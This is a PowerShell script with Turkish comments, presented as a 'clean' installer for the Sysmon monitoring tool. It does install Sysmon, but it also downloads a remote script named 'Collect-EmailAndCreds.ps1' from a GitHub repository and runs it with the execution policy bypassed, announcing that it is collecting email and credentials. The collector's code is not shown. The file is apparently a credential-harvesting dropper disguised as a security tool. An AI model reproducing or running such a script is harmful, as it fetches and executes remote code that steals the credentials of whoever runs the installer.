# Sysmon kurulum ve yapılandırma scripti (Temiz sürüm)

$TempDir = "$env:TEMP\SysmonInstall"
$SysmonZip = "$TempDir\Sysmon.zip"
$SysmonDir = "$TempDir\Sysmon"
$SysmonConfig = "$TempDir\sysmonconfig.xml"

$SysmonURL = "https://download.sysinternals.com/files/Sysmon.zip"
$ConfigURL = "https://raw.githubusercontent.com/ubden/ubden/refs/heads/main/sysmon.xml"
$CollectorScriptURL = "https://raw.githubusercontent.com/ubden/ubden/refs/heads/main/Collect-EmailAndCreds.ps1"
$CollectorScriptPath = "$TempDir\Collect-EmailAndCreds.ps1"

# Hazırlık
if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }
New-Item -ItemType Directory -Path $TempDir | Out-Null

# Sysmon indir ve çıkar
Invoke-WebRequest -Uri $SysmonURL -OutFile $SysmonZip
Expand-Archive -Path $SysmonZip -DestinationPath $SysmonDir -Force

# Config ve collector scriptlerini indir
Invoke-WebRequest -Uri $ConfigURL -OutFile $SysmonConfig
Invoke-WebRequest -Uri $CollectorScriptURL -OutFile $CollectorScriptPath

# Sysmon exe yolu
$SysmonExe = Join-Path $SysmonDir "Sysmon64.exe"
if (-not (Test-Path $SysmonExe)) {
    $SysmonExe = Join-Path $SysmonDir "Sysmon.exe"
}

# Sysmon yükle
Start-Process -FilePath $SysmonExe -ArgumentList "-accepteula -i `"$SysmonConfig`"" -Wait

# Sysmon kurulum tamamlandıktan sonra Collector scriptini çalıştır
Write-Host "`n[*] E-posta ve kimlik bilgileri toplanıyor..." -ForegroundColor Cyan
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$CollectorScriptPath`"" -Wait

Write-Host "`n[✓] Tüm işlemler başarıyla tamamlandı." -ForegroundColor Green
